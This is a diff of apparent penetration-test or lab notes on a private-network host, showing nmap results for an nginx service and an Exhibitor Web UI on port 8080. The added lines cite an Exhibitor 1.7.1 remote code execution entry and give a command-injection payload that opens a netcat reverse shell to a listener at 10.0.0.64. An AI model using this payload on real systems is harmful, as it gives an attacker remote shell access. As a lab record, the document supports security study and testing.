@@ -54,6 +54,9 @@ sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport
 |_http-server-header: nginx/1.14.2
 |_http-title: Did not follow redirect to http://192.168.180.98:8080/exhibitor/v1/ui/index.html
 
+# 8080 : Exhibitor Web UI 1.7.1 - Remote Code Execution
+# https://www.exploit-db.com/exploits/48654
+$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
 
 
 
